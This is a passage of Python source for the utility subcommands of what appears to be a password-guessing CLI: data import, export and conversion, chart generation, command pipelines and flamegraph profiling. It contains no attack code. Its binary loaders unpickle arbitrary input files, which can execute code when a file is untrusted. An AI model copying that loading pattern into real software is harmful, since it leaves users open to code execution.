                "script": script_file,
                "timestamp": datetime.now().isoformat(),
                "commands": recorded_commands
            }
            with open(args.record, "w") as f:
                json.dump(session_data, f, indent=2)
            print(f"\n  [OK] Session recorded to {args.record}")

    except Exception as e:
        print(f"[!] Script error: {e}")


def cmd_data(args):
    """Data import/export/convert commands."""
    action = args.action
    input_file = args.input
    output_file = args.output
    fmt = args.format

    if action in ["import", "validate", "stats", "load"]:
        if not input_file:
            print(f"[!] Specify input file with --input")
            return
        if not os.path.exists(input_file) and action != "load":
            print(f"[!] Input file not found: {input_file}")
            return

    print(f"\n[+] Data operation: {action}")
    if input_file:
        print(f"  Input: {input_file}")
    print(f"  Format: {fmt}")

    if action == "import":
        _data_import(input_file, output_file, fmt, args)
    elif action == "export":
        _data_export(input_file, output_file, fmt, args)
    elif action == "convert":
        if not input_file:
            print("[!] Specify input file with --input")
            return
        _data_convert(input_file, output_file, fmt)
    elif action == "merge":
        _data_merge(input_file, output_file, args)
    elif action == "validate":
        _data_validate(input_file, fmt)
    elif action == "stats":
        _data_stats(input_file, fmt)
    elif action == "save":
        _data_save_binary(output_file, fmt, args)
    elif action == "load":
        _data_load_binary(input_file, fmt, args)
        _data_stats(input_file, fmt)


def _data_import(input_file, output_file, fmt, args):
    """Import data from file."""
    print(f"\n[+] Importing data...")

    fields = args.fields.split(",") if args.fields else None
    filter_expr = args.filter
    limit = args.limit

    try:
        # Detect format
        if fmt == "auto":
            fmt = _detect_format(input_file)

        if fmt == "csv":
            import csv
            rows = []
            with open(input_file, "r", encoding="utf-8") as f:
                reader = csv.DictReader(f) if fields else csv.reader(f)
                if fields:
                    for row in reader:
                        if filter_expr and not _eval_filter(row, filter_expr):
                            continue
                        rows.append(row)
                        if limit and len(rows) >= limit:
                            break
                else:
                    for row in reader:
                        rows.append(row)
                        if limit and len(rows) >= limit:
                            break
            print(f"  [OK] Imported {len(rows)} rows")

            if output_file:
                _write_csv(output_file, rows)
                print(f"  [OK] Saved to {output_file}")

        elif fmt == "json":
            with open(input_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                print(f"  [OK] Imported {len(data)} items")
            else:
                print(f"  [OK] Imported JSON object")

            if output_file:
                with open(output_file, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                print(f"  [OK] Saved to {output_file}")

        elif fmt == "yaml":
            import yaml
            with open(input_file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
            print(f"  [OK] Imported YAML data")

            if output_file:
                with open(output_file, "w", encoding="utf-8") as f:
                    yaml.dump(data, f)
                print(f"  [OK] Saved to {output_file}")

        else:
            print(f"  [ERROR] Unsupported format: {fmt}")

    except Exception as e:
        print(f"  [ERROR] {e}")


def _data_export(input_file, output_file, fmt, args):
    """Export data to file."""
    print(f"\n[+] Exporting data...")

    try:
        # Read input
        if fmt == "auto":
            fmt = _detect_format(input_file)

        if fmt == "json":
            with open(input_file, "r", encoding="utf-8") as f:
                data = json.load(f)
        elif fmt == "csv":
            import csv
            rows = []
            with open(input_file, "r", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                rows = list(reader)
            data = rows
        else:
            with open(input_file, "r", encoding="utf-8") as f:
                data = f.read()

        # Write output
        if not output_file:
            print("  [ERROR] Specify output file with --output")
            return

        if fmt == "csv" or args.format == "csv":
            _write_csv(output_file, data)
        elif fmt == "json" or args.format == "json":
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        elif args.format == "yaml":
            import yaml
            with open(output_file, "w", encoding="utf-8") as f:
                yaml.dump(data, f)
        elif args.format == "xml":
            _write_xml(output_file, data)
        elif args.format == "markdown":
            _write_markdown(output_file, data)

        print(f"  [OK] Exported to {output_file}")

    except Exception as e:
        print(f"  [ERROR] {e}")


def _data_convert(input_file, output_file, fmt):
    """Convert data between formats."""
    print(f"\n[+] Converting data...")

    if not output_file:
        # Generate output filename based on format
        base = os.path.splitext(input_file)[0]
        output_file = f"{base}.{fmt}"
        print(f"  Output: {output_file}")

    try:
        # Detect input format
        in_fmt = _detect_format(input_file)
        print(f"  From: {in_fmt} -> To: {fmt}")

        # Read data
        if in_fmt == "csv":
            import csv
            with open(input_file, "r", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                data = list(reader)
        elif in_fmt == "json":
            with open(input_file, "r", encoding="utf-8") as f:
                data = json.load(f)
        elif in_fmt == "yaml":
            import yaml
            with open(input_file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
        else:
            print(f"  [ERROR] Cannot convert from {in_fmt}")
            return

        # Write output
        if fmt == "json":
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        elif fmt == "csv":
            _write_csv(output_file, data)
        elif fmt == "yaml":
            import yaml
            with open(output_file, "w", encoding="utf-8") as f:
                yaml.dump(data, f)
        elif fmt == "xml":
            _write_xml(output_file, data)

        print(f"  [OK] Converted to {output_file}")

    except Exception as e:
        print(f"  [ERROR] {e}")


def _data_merge(input_file, output_file, args):
    """Merge multiple files."""
    print(f"\n[+] Merging files...")

    # input_file can contain multiple files separated by comma
    files = input_file.split(",")

    merged = []
    for f in files:
        f = f.strip()
        if not os.path.exists(f):
            print(f"  [SKIP] {f} not found")
            continue

        fmt = _detect_format(f)
        if fmt == "csv":
            import csv
            with open(f, "r", encoding="utf-8") as fp:
                reader = csv.DictReader(fp)
                merged.extend(list(reader))
        elif fmt == "json":
            with open(f, "r", encoding="utf-8") as fp:
                data = json.load(fp)
                if isinstance(data, list):
                    merged.extend(data)
                else:
                    merged.append(data)

    print(f"  [OK] Merged {len(merged)} records from {len(files)} files")

    if output_file:
        if output_file.endswith(".json"):
            with open(output_file, "w", encoding="utf-8") as f:
                json.dump(merged, f, indent=2)
        elif output_file.endswith(".csv"):
            _write_csv(output_file, merged)
        print(f"  [OK] Saved to {output_file}")


def _data_validate(input_file, fmt):
    """Validate data file."""
    print(f"\n[+] Validating {input_file}...")

    if fmt == "auto":
        fmt = _detect_format(input_file)

    errors = []
    try:
        if fmt == "json":
            with open(input_file, "r", encoding="utf-8") as f:
                json.load(f)
            print("  [OK] Valid JSON")

        elif fmt == "csv":
            import csv
            with open(input_file, "r", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                rows = list(reader)
                if not rows:
                    errors.append("Empty CSV file")
                else:
                    headers = reader.fieldnames
                    print(f"  [OK] Valid CSV ({len(rows)} rows, {len(headers)} columns)")
                    print(f"  Headers: {', '.join(headers)}")

        elif fmt == "yaml":
            import yaml
            with open(input_file, "r", encoding="utf-8") as f:
                yaml.safe_load(f)
            print("  [OK] Valid YAML")

        if errors:
            print(f"\n  [WARNINGS]")
            for err in errors:
                print(f"    - {err}")

    except json.JSONDecodeError as e:
        print(f"  [ERROR] Invalid JSON: {e}")
    except Exception as e:
        print(f"  [ERROR] {e}")


def _data_stats(input_file, fmt):
    """Show data statistics."""
    print(f"\n[+] Statistics for {input_file}...\n")

    size = os.path.getsize(input_file)
    print(f"  Size: {size / 1024:.2f} KB")

    if fmt == "auto":
        fmt = _detect_format(input_file)

    if fmt == "json":
        with open(input_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            print(f"  Items: {len(data)}")
            if data:
                print(f"  Keys: {list(data[0].keys()) if isinstance(data[0], dict) else 'N/A'}")
        else:
            print(f"  Type: object")

    elif fmt == "csv":
        import csv
        with open(input_file, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = list(reader)
        print(f"  Rows: {len(rows)}")
        if rows:
            print(f"  Columns: {len(rows[0])}")
            print(f"  Headers: {', '.join(rows[0].keys())}")

    elif fmt == "yaml":
        import yaml
        with open(input_file, "r", encoding="utf-8") as f:
            data = yaml.safe_load(f)
        print(f"  Type: {type(data).__name__}")


def _detect_format(filename: str) -> str:
    """Detect file format from extension."""
    ext = os.path.splitext(filename)[1].lower()
    formats = {
        ".json": "json",
        ".csv": "csv",
        ".yaml": "yaml",
        ".yml": "yaml",
        ".xml": "xml",
        ".txt": "txt",
        ".pickle": "pickle",
        ".pkl": "pickle",
        ".joblib": "joblib",
        ".npz": "npz",
        ".npy": "npy",
    }
    return formats.get(ext, "unknown")


def _data_save_binary(output_file, fmt, args):
    """Save data in binary format (pickle/joblib/npz)."""
    if not output_file:
        print("[!] Specify output file with --output")
        return

    input_file = args.input
    if not input_file or not os.path.exists(input_file):
        print("[!] Specify input data file with --input")
        return

    # Load input data
    in_fmt = _detect_format(input_file)
    data = _load_export_data(input_file)

    print(f"  Saving as {fmt}...")

    try:
        if fmt in ("pickle", "auto") or output_file.endswith((".pickle", ".pkl")):
            import pickle
            with open(output_file, "wb") as f:
                pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)
            size = os.path.getsize(output_file)
            print(f"  [OK] Saved as pickle: {output_file} ({size / 1024:.1f} KB)")

        elif fmt == "joblib" or output_file.endswith(".joblib"):
            try:
                import joblib
                joblib.dump(data, output_file, compress=3)
                size = os.path.getsize(output_file)
                print(f"  [OK] Saved as joblib: {output_file} ({size / 1024:.1f} KB)")
            except ImportError:
                print("  [!] joblib not installed. Install with: pip install joblib")
                return

        elif fmt in ("npz", "npy") or output_file.endswith((".npz", ".npy")):
            import numpy as np
            if isinstance(data, dict):
                # Save dict values as npz arrays
                arrays = {}
                for k, v in data.items():
                    try:
                        arrays[k] = np.array(v) if not isinstance(v, (str, dict)) else np.array(str(v))
                    except Exception:
                        arrays[k] = np.array(str(v))
                np.savez_compressed(output_file, **arrays)
            elif isinstance(data, list):
                np.savez_compressed(output_file, data=np.array(data))
            else:
                np.save(output_file, np.array(data))

            size = os.path.getsize(output_file)
            print(f"  [OK] Saved as numpy: {output_file} ({size / 1024:.1f} KB)")

    except Exception as e:
        print(f"  [ERROR] {e}")


def _data_load_binary(input_file, fmt, args):
    """Load data from binary format."""
    if not input_file or not os.path.exists(input_file):
        print("[!] Specify input file with --input")
        return

    print(f"  Loading from {fmt}...")

    try:
        if fmt in ("pickle", "auto") or input_file.endswith((".pickle", ".pkl")):
            import pickle
            with open(input_file, "rb") as f:
                data = pickle.load(f)
            print(f"  [OK] Loaded pickle data: {type(data).__name__}")

        elif fmt == "joblib" or input_file.endswith(".joblib"):
            import joblib
            data = joblib.load(input_file)
            print(f"  [OK] Loaded joblib data: {type(data).__name__}")

        elif fmt in ("npz", "npy") or input_file.endswith((".npz", ".npy")):
            import numpy as np
            loaded = np.load(input_file, allow_pickle=True)
            if isinstance(loaded, np.lib.npyio.NpzFile):
                print(f"  [OK] Loaded npz: {list(loaded.keys())}")
                for key in loaded.keys():
                    arr = loaded[key]
                    print(f"    {key}: shape={arr.shape}, dtype={arr.dtype}")
            else:
                print(f"  [OK] Loaded npy: shape={loaded.shape}, dtype={loaded.dtype}")

        # Save as JSON if output specified
        output_file = args.output
        if output_file:
            if not isinstance(data, (str, bytes)):
                with open(output_file, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, default=str)
                print(f"  [OK] Exported to {output_file}")

    except Exception as e:
        print(f"  [ERROR] {e}")


def _write_csv(filename, data):
    """Write data to CSV."""
    import csv
    if not data:
        return
    if isinstance(data[0], dict):
        with open(filename, "w", encoding="utf-8", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=data[0].keys())
            writer.writeheader()
            writer.writerows(data)
    else:
        with open(filename, "w", encoding="utf-8", newline="") as f:
            writer = csv.writer(f)
            writer.writerows(data)


def _write_xml(filename, data):
    """Write data to XML."""
    import xml.etree.ElementTree as ET

    root = ET.Element("data")

    if isinstance(data, list):
        for item in data:
            record = ET.SubElement(root, "record")
            if isinstance(item, dict):
                for k, v in item.items():
                    child = ET.SubElement(record, k)
                    child.text = str(v)

    tree = ET.ElementTree(root)
    tree.write(filename, encoding="utf-8", xml_declaration=True)


def _write_markdown(filename, data):
    """Write data as markdown table."""
    if not data:
        return

    with open(filename, "w", encoding="utf-8") as f:
        if isinstance(data, list) and data:
            # Get headers
            if isinstance(data[0], dict):
                headers = list(data[0].keys())
                f.write("| " + " | ".join(headers) + " |\n")
                f.write("| " + " | ".join(["---"] * len(headers)) + " |\n")
                for row in data:
                    f.write("| " + " | ".join(str(row.get(h, "")) for h in headers) + " |\n")

    print(f"  [OK] Markdown table written")


def _eval_filter(row, expr):
    """Simple filter expression evaluator."""
    try:
        # Very basic filter: field == value, field != value
        if "==" in expr:
            field, value = expr.split("==")
            return str(row.get(field.strip(), "")) == value.strip().strip("'\"")
        elif "!=" in expr:
            field, value = expr.split("!=")
            return str(row.get(field.strip(), "")) != value.strip().strip("'\"")
        return True
    except:
        return True


def cmd_output(args):
    """Output formatting commands."""
    fmt = args.format
    output_file = args.file

    print(f"\n[+] Output format: {fmt}")
    print(f"  Width: {args.width}")
    print(f"  Color: {'enabled' if args.color else 'disabled'}")

    # Generate sample output
    sample_data = [
        {"Name": "Alice", "Age": 30, "City": "New York"},
        {"Name": "Bob", "Age": 25, "City": "London"},
        {"Name": "Charlie", "Age": 35, "City": "Paris"},
    ]

    if fmt == "table":
        print("\n  " + "-" * 50)
        for row in sample_data:
            print(f"  {row['Name']:<10} {row['Age']:<5} {row['City']}")
        print("  " + "-" * 50)

    elif fmt == "json":
        output = json.dumps(sample_data, indent=2)
        print(f"\n{output}")

    elif fmt == "csv":
        import csv
        from io import StringIO
        s = StringIO()
        writer = csv.DictWriter(s, fieldnames=["Name", "Age", "City"])
        writer.writeheader()
        writer.writerows(sample_data)
        print(f"\n{s.getvalue()}")

    elif fmt == "markdown":
        print("\n| Name | Age | City |")
        print("|------|-----|------|")
        for row in sample_data:
            print(f"| {row['Name']} | {row['Age']} | {row['City']} |")

    elif fmt == "html":
        print("\n<table>")
        print("  <tr><th>Name</th><th>Age</th><th>City</th></tr>")
        for row in sample_data:
            print(f"  <tr><td>{row['Name']}</td><td>{row['Age']}</td><td>{row['City']}</td></tr>")
        print("</table>")

    elif fmt == "yaml":
        import yaml
        print("\n" + yaml.dump(sample_data))

    # Write to file if specified
    if output_file:
        with open(output_file, "w", encoding="utf-8") as f:
            if fmt == "json":
                f.write(json.dumps(sample_data, indent=2))
            elif fmt == "markdown":
                f.write("| Name | Age | City |\n")
                f.write("|------|-----|------|\n")
                for row in sample_data:
                    f.write(f"| {row['Name']} | {row['Age']} | {row['City']} |\n")
        print(f"\n  [OK] Written to {output_file}")


# ==================== Chart & Visualization ====================

def cmd_chart(args):
    """Generate charts and visualizations."""
    chart_type = args.type
    data_file = args.data
    output_file = args.output
    title = args.title or "Chart"
    width = args.width
    height = args.height
    style = args.style
    interactive = args.interactive

    # Check matplotlib availability
    if interactive:
        try:
            import plotly.graph_objects as go
        except ImportError:
            print("[!] plotly not installed. Install with: pip install plotly")
            print("    Falling back to matplotlib (static image)")
            interactive = False

    try:
        import matplotlib
        matplotlib.use("Agg")  # Non-interactive backend
        import matplotlib.pyplot as plt
        import matplotlib.font_manager as fm
        import numpy as np
    except ImportError:
        print("[!] matplotlib not installed. Install with: pip install matplotlib numpy")
        return

    # Apply style
    style_map = {
        "default": "default",
        "dark": "dark_background",
        "ggplot": "ggplot",
        "seaborn": "seaborn-v0_8",
        "bmh": "bmh",
    }
    plt.style.use(style_map.get(style, "default"))

    # Load data
    if data_file:
        data = _load_chart_data(data_file)
        if data is None:
            return
    else:
        # Demo data
        data = _demo_data()

    print(f"\n[+] Generating {chart_type} chart...")
    print(f"  Output: {output_file}")
    print(f"  Size: {width}x{height}")
    print(f"  Style: {style}")

    # Handle Chinese font
    _setup_fonts(plt)

    if interactive:
        fig = _generate_plotly_chart(chart_type, data, title, args)
        if output_file.endswith(".html"):
            fig.write_html(output_file)
        else:
            fig.write_image(output_file, width=width, height=height)
        print(f"  [OK] Interactive chart saved to {output_file}")
    else:
        fig, ax = plt.subplots(figsize=(width / 100, height / 100), dpi=100)
        _generate_chart(plt, ax, chart_type, data, title, args)

        # Save
        plt.tight_layout()
        plt.savefig(output_file, dpi=100, bbox_inches="tight",
                    facecolor="white", edgecolor="none")
        plt.close(fig)
        print(f"  [OK] Chart saved to {output_file}")


def _setup_fonts(plt):
    """Setup fonts for CJK support."""
    import matplotlib.font_manager as fm
    # Try to find a font that supports CJK
    for font_name in ["SimHei", "Microsoft YaHei", "WenQuanYi Micro Hei",
                       "Noto Sans CJK", "Arial Unicode MS"]:
        font_path = fm.findfont(fm.FontProperties(family=font_name))
        if font_path and "LastResort" not in font_path:
            plt.rcParams["font.sans-serif"] = [font_name, "DejaVu Sans"]
            plt.rcParams["axes.unicode_minus"] = False
            return


def _load_chart_data(filepath):
    """Load data from JSON or CSV file."""
    ext = os.path.splitext(filepath)[1].lower()

    try:
        if ext == ".json":
            with open(filepath, "r", encoding="utf-8") as f:
                raw = json.load(f)

            # Support different JSON structures
            if isinstance(raw, dict):
                # {labels: [...], values: [...]}
                if "labels" in raw and "values" in raw:
                    return raw
                # {series: [{name, data}, ...]}
                if "series" in raw:
                    return raw
                # Arbitrary dict -> keys as labels, values as data
                return {"labels": list(raw.keys()), "values": list(raw.values())}
            elif isinstance(raw, list):
                # List of dicts with consistent keys
                if raw and isinstance(raw[0], dict):
                    labels = list(raw[0].keys())
                    values = [list(row.values()) for row in raw]
                    return {"labels": labels, "values": values, "rows": raw}
                # Simple list of numbers
                return {"labels": [str(i) for i in range(len(raw))], "values": raw}
            return raw

        elif ext == ".csv":
            import csv
            with open(filepath, "r", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                rows = list(reader)

            if rows:
                labels = list(rows[0].keys())
                values = [list(row.values()) for row in rows]
                return {"labels": labels, "values": values, "rows": rows}
        else:
            print(f"  [ERROR] Unsupported data format: {ext}")
            return None

    except Exception as e:
        print(f"  [ERROR] Failed to load data: {e}")
        return None


def _demo_data():
    """Generate demo data for chart preview."""
    return {
        "labels": ["Password Policy", "Network Security", "Web Security",
                    "System Admin", "Physical Security", "Social Engineering"],
        "values": [85, 72, 90, 65, 55, 78],
    }


def _generate_chart(plt, ax, chart_type, data, title, args):
    """Generate a matplotlib chart."""
    labels = data.get("labels", [])
    values = data.get("values", [])
    colors = None
    if args.color:
        colors = args.color.split(",")

    xlabel = args.xlabel or ""
    ylabel = args.ylabel or ""
    show_grid = not args.no_grid
    show_legend = args.legend

    if chart_type == "bar":
        if isinstance(values[0], (list, tuple)) if values else False:
            # Multi-series bar chart
            x = np.arange(len(labels))
            width = 0.8 / len(values)
            for i, vals in enumerate(values):
                offset = (i - len(values) / 2 + 0.5) * width
                ax.bar(x + offset, vals, width=width, label=f"Series {i+1}")
            ax.set_xticks(x)
            ax.set_xticklabels(labels, rotation=45, ha="right")
        else:
            ax.bar(labels, values, color=colors)
            ax.tick_params(axis="x", rotation=45)

        ax.set_title(title, fontsize=16, fontweight="bold")
        ax.set_xlabel(xlabel)
        ax.set_ylabel(ylabel or "Value")
        ax.grid(show_grid, axis="y", alpha=0.3)

    elif chart_type == "line":
        if isinstance(values[0], (list, tuple)) if values else False:
            for i, vals in enumerate(values):
                ax.plot(labels, vals, marker="o", label=f"Series {i+1}")
        else:
            ax.plot(labels, values, marker="o", linewidth=2, markersize=8, color=colors[0] if colors else None)
            ax.fill_between(labels, values, alpha=0.15)

        ax.set_title(title, fontsize=16, fontweight="bold")
        ax.set_xlabel(xlabel)
        ax.set_ylabel(ylabel or "Value")
        ax.grid(show_grid, alpha=0.3)

    elif chart_type == "pie":
        wedges, texts, autotexts = ax.pie(
            values, labels=labels, autopct="%1.1f%%",
            colors=colors, startangle=90,
            textprops={"fontsize": 10}
        )
        ax.set_title(title, fontsize=16, fontweight="bold")

    elif chart_type == "scatter":
        if isinstance(values[0], (list, tuple)) if values else False:
            x_vals = values[0]
            y_vals = values[1] if len(values) > 1 else values[0]
        else:
            x_vals = range(len(values))
            y_vals = values
        ax.scatter(x_vals, y_vals, s=100, alpha=0.7, color=colors[0] if colors else None)
        ax.set_title(title, fontsize=16, fontweight="bold")
        ax.set_xlabel(xlabel)
        ax.set_ylabel(ylabel or "Value")
        ax.grid(show_grid, alpha=0.3)

    elif chart_type == "histogram":
        ax.hist(values, bins=20, color=colors[0] if colors else "steelblue",
                edgecolor="white", alpha=0.8)
        ax.set_title(title, fontsize=16, fontweight="bold")
        ax.set_xlabel(xlabel or "Value")
        ax.set_ylabel(ylabel or "Frequency")
        ax.grid(show_grid, axis="y", alpha=0.3)

    elif chart_type == "heatmap":
        import numpy as np
        if isinstance(values[0], (list, tuple)) if values else False:
            matrix = np.array(values, dtype=float)
        else:
            size = int(len(values) ** 0.5)
            matrix = np.array(values[:size*size], dtype=float).reshape(size, size)

        im = ax.imshow(matrix, cmap="YlOrRd", aspect="auto")
        ax.set_xticks(range(len(labels)))
        ax.set_xticklabels(labels, rotation=45, ha="right")
        ax.set_title(title, fontsize=16, fontweight="bold")
        plt.colorbar(im, ax=ax)

    elif chart_type == "radar":
        import numpy as np
        if not labels:
            return
        n = len(labels)
        angles = np.linspace(0, 2 * np.pi, n, endpoint=False).tolist()
        angles += angles[:1]

        vals = values + values[:1] if not isinstance(values[0], (list, tuple)) else values

        ax.remove()
        ax = plt.subplot(111, polar=True)

        if isinstance(values[0], (list, tuple)):
            for i, v in enumerate(values):
                v_closed = v + v[:1]
                ax.plot(angles, v_closed, "o-", linewidth=2, label=f"Series {i+1}")
                ax.fill(angles, v_closed, alpha=0.1)
        else:
            vals_closed = values + values[:1]
            ax.plot(angles, vals_closed, "o-", linewidth=2, color=colors[0] if colors else None)
            ax.fill(angles, vals_closed, alpha=0.25)

        ax.set_xticks(angles[:-1])
        ax.set_xticklabels(labels)
        ax.set_title(title, fontsize=16, fontweight="bold", y=1.08)

    elif chart_type == "treemap":
        try:
            import squarify
            squarify.plot(sizes=values, label=labels, alpha=0.8,
                         color=colors or None, text_kwargs={"fontsize": 9})
            ax.set_title(title, fontsize=16, fontweight="bold")
            ax.axis("off")
        except ImportError:
            print("  [!] squarify not installed. Install with: pip install squarify")
            print("    Falling back to bar chart")
            ax.bar(labels, values, color=colors)
            ax.set_title(title, fontsize=16, fontweight="bold")

    elif chart_type == "bubble":
        import numpy as np
        if isinstance(values[0], (list, tuple)) if values else False:
            x_vals = values[0]
            y_vals = values[1] if len(values) > 1 else values[0]
            sizes = values[2] if len(values) > 2 else [100] * len(x_vals)
        else:
            x_vals = range(len(values))
            y_vals = values
            sizes = [v * 2 for v in values]

        ax.scatter(x_vals, y_vals, s=sizes, alpha=0.6,
                   color=colors[0] if colors else None, edgecolors="grey", linewidth=0.5)
        ax.set_title(title, fontsize=16, fontweight="bold")
        ax.set_xlabel(xlabel)
        ax.set_ylabel(ylabel)
        ax.grid(show_grid, alpha=0.3)

    if show_legend:
        ax.legend()

    return ax


def _generate_plotly_chart(chart_type, data, title, args):
    """Generate a plotly interactive chart."""
    import plotly.graph_objects as go

    labels = data.get("labels", [])
    values = data.get("values", [])

    if chart_type == "bar":
        fig = go.Figure(data=[go.Bar(x=labels, y=values)])
    elif chart_type == "line":
        fig = go.Figure(data=[go.Scatter(x=labels, y=values, mode="lines+markers",
                                          fill="tozeroy")])
    elif chart_type == "pie":
        fig = go.Figure(data=[go.Pie(labels=labels, values=values)])
    elif chart_type == "scatter":
        fig = go.Figure(data=[go.Scatter(x=labels, y=values, mode="markers",
                                          marker=dict(size=15))])
    elif chart_type == "heatmap":
        import numpy as np
        if isinstance(values[0], (list, tuple)) if values else False:
            matrix = np.array(values, dtype=float)
        else:
            size = int(len(values) ** 0.5)
            matrix = np.array(values[:size*size], dtype=float).reshape(size, size)
        fig = go.Figure(data=[go.Heatmap(z=matrix, x=labels, y=labels,
                                          colorscale="YlOrRd")])
    elif chart_type == "radar":
        fig = go.Figure(data=[go.Scatterpolar(r=values, theta=labels, fill="toself")])
    else:
        fig = go.Figure(data=[go.Bar(x=labels, y=values)])

    fig.update_layout(title=title, width=args.width, height=args.height)
    return fig


def cmd_pipeline(args):
    """Execute command pipelines."""
    commands = args.commands
    continue_on_error = args.continue_on_error
    output_file = args.output
    parallel = args.parallel

    print(f"\n[+] Pipeline: {len(commands)} commands")
    print(f"  Parallel: {parallel}")
    print(f"  Continue on error: {continue_on_error}\n")

    results = []

    if parallel:
        # Run commands in parallel using subprocess
        import concurrent.futures
        import subprocess

        def run_cmd(cmd_str):
            parts = shlex.split(cmd_str)
            start = time.time()
            result = subprocess.run(
                [sys.executable, "password_guesser/cli.py"] + parts,
                capture_output=True, text=True
            )
            elapsed = time.time() - start
            return cmd_str, result.returncode, elapsed, result.stdout[:500], result.stderr[:200]

        with concurrent.futures.ThreadPoolExecutor(max_workers=len(commands)) as executor:
            futures = {executor.submit(run_cmd, cmd): cmd for cmd in commands}
            for future in concurrent.futures.as_completed(futures):
                cmd_str, returncode, elapsed, stdout, stderr = future.result()
                status = "OK" if returncode == 0 else "FAIL"
                results.append((cmd_str, status, elapsed))
                print(f"  [{status}] {cmd_str} ({elapsed:.2f}s)")
                if returncode != 0 and stderr:
                    print(f"    Error: {stderr[:100]}")
    else:
        # Sequential execution
        for i, cmd_str in enumerate(commands, 1):
            print(f"  [{i}/{len(commands)}] {cmd_str}")
            parts = shlex.split(cmd_str)

            start = time.time()
            import subprocess
            result = subprocess.run(
                [sys.executable, "password_guesser/cli.py"] + parts,
                capture_output=True, text=True
            )
            elapsed = time.time() - start

            status = "OK" if result.returncode == 0 else "FAIL"
            results.append((cmd_str, status, elapsed))

            if result.stdout:
                print(result.stdout[:500])
            if result.returncode != 0:
                print(f"    [!] Error: {result.stderr[:200]}")
                if not continue_on_error:
                    print("\n  [!] Pipeline stopped due to error")
                    break
            print(f"    ({elapsed:.2f}s)")

    # Summary
    print(f"\n{'=' * 50}")
    print("Pipeline Summary:")
    total_time = sum(r[2] for r in results)
    for cmd_str, status, elapsed in results:
        print(f"  [{status}] {cmd_str} ({elapsed:.2f}s)")
    print(f"  Total: {total_time:.2f}s")

    if output_file:
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump({
                "pipeline": commands,
                "results": [{"cmd": c, "status": s, "time": t} for c, s, t in results],
                "total_time": total_time
            }, f, indent=2)
        print(f"  Results saved to {output_file}")


def cmd_flamegraph(args):
    """Generate performance flamegraphs."""
    action = args.action
    output_file = args.output

    if action == "record":
        print(f"\n[+] Recording flamegraph...")
        print(f"  Duration: {args.duration}s")
        print(f"  Output: {output_file}")

        import cProfile
        import pstats

        # If a command is specified, profile it
        if args.command:
            cmd_parts = shlex.split(args.command)
            profiler = cProfile.Profile()
            profiler.enable()

            import subprocess
            start = time.time()
            subprocess.run([sys.executable, "password_guesser/cli.py"] + cmd_parts)
            elapsed = time.time() - start

            profiler.disable()

            # Generate flamegraph data
            stats = pstats.Stats(profiler)
            stats.sort_stats("cumulative")

            if args.format == "json":
                # Export as JSON for visualization
                func_data = []
                for func, (cc, nc, tt, ct, callers) in stats.stats.items():
                    func_data.append({
                        "function": f"{func[0]}:{func[1]}({func[2]})",
                        "calls": nc,
                        "total_time": ct,
                        "self_time": tt,
                    })
                with open(output_file, "w") as f:
                    json.dump(func_data, f, indent=2)
            elif args.format == "svg":
                # Generate SVG flamegraph
                _generate_text_flamegraph(stats, output_file)
            else:
                # HTML format
                _generate_html_flamegraph(stats, output_file)

            print(f"  [OK] Flamegraph saved to {output_file}")
        else:
            print("  [INFO] Specify --command to profile a command")
            print("  Example: flamegraph --command 'train -d data.txt' -o flame.svg")

    elif action == "view":
        if os.path.exists(output_file):
            print(f"\n[+] Opening {output_file}...")
            import webbrowser
            webbrowser.open(output_file)
        else:
            print(f"  [!] File not found: {output_file}")

    elif action == "compare":
        print("\n[+] Compare profiling results...")
        print("  Specify two .prof files to compare")

    elif action == "live":
        print("\n[+] Live profiling mode...")
        print("  Monitoring system performance")
        print("  Press Ctrl+C to stop\n")

        try:
            import psutil
            import threading

            stop_event = threading.Event()

            def monitor():
                while not stop_event.is_set():
                    cpu = psutil.cpu_percent(interval=1)
                    mem = psutil.virtual_memory()
                    print(f"  CPU: {cpu:5.1f}% | MEM: {mem.percent:5.1f}% ({mem.used // (1024**3):.1f}/{mem.total // (1024**3):.1f} GB)")

            monitor_thread = threading.Thread(target=monitor, daemon=True)
            monitor_thread.start()

            stop_event.wait(timeout=args.duration)
            stop_event.set()

        except ImportError:
            print("  [!] psutil not installed. Install with: pip install psutil")
        except KeyboardInterrupt:
            print("\n  [+] Stopped")


def _generate_text_flamegraph(stats, output_file):
    """Generate a text-based flamegraph representation."""
    lines = ["<!DOCTYPE html><html><head><style>",
             "body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }",
             ".frame { display: inline-block; padding: 2px 6px; margin: 1px; border-radius: 3px; "
             "cursor: pointer; font-size: 11px; }",
             ".frame:hover { outline: 2px solid white; }",
             "h1 { color: #e94560; }",
             ".row { white-space: nowrap; margin: 2px 0; }",
             "</style></head><body>",
             "<h1>Flamegraph</h1>"]

    # Sort by cumulative time
    stats.sort_stats("cumulative")
    func_list = stats.stats.items()

    # Color palette
    colors = ["#e94560", "#0f3460", "#16213e", "#533483", "#e94560",
              "#f38181", "#fce38a", "#eaffd0", "#95e1d3", "#aa96da"]

    for i, (func, (cc, nc, tt, ct, callers)) in enumerate(sorted(func_list, key=lambda x: -x[1][3])):
        filename, line_no, funcname = func
        width = max(int(ct * 200), 20)
        color = colors[i % len(colors)]
        pct = ct / max(sum(x[1][3] for x in func_list), 0.001) * 100
        short_name = f"{os.path.basename(filename)}:{funcname}"
        lines.append(
            f'<div class="row"><span class="frame" style="background:{color};width:{width}px;" '
            f'title="{filename}:{line_no} {funcname} - {ct:.3f}s ({pct:.1f}%)">'
            f'{short_name[:40]}</span></div>'
        )

    lines.append("</body></html>")

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def _generate_html_flamegraph(stats, output_file):
